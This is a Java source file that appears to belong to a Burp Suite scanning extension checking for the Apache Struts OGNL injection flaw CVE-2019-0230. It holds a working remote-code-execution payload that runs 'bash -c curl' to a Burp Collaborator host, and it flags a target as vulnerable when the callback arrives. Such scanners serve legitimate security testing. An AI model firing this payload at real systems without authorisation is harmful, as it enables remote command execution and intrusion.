package burp.vuls;

import burp.*;
import burp.util.HttpRequestThread;
import burp.util.HttpResult;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.util.List;

public class Struts {

    public static void CVE_2019_0230() {
        // TODO 待完成
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        String poc = "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(new java.lang.String[]{'bash','-c','curl http://" + val +"'}))}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(poc);
        Thread thread = new Thread(httpRequestThread);
        thread.start();
        try {
            // 等待，直到运行结束
            thread.join();
        } catch (InterruptedException e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "CVE-2019-0230", "", "hack!"));
        }else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "CVE-2019-0230", "", "pass"));
        }
    }

}
